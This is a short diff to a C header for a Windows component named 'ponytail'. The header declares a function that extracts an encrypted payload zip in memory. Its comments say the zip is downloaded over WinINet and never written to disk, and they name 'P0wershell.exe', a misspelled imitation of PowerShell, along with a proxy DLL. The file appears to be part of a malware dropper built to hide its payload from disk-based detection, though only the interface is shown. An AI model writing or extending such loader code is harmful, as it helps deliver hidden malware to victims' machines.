@@ -3,11 +3,12 @@
 
 #include <windows.h>
 
-/* ponytail: shared ZipCrypto extraction used by both P0wershell.exe (live
-   download) and userenv_proxy.dll (previously the in-process worker). */
+/* ponytail: in-memory ZipCrypto extraction. The zip never touches disk —
+   caller fetches payload.zip into a heap buffer (WinINet) and hands us the
+   bytes; we decrypt + inflate in memory and write only the final exe. */
 typedef void (*audit_fn)(const char *fmt, ...);
 extern audit_fn g_audit_fn;
 
-BOOL extract_payload(const char *zipPath, const char *outExe, const char *pw);
+BOOL extract_payload_mem(const unsigned char *zip, size_t zipLen, const char *outExe, const char *pw);
 
 #endif
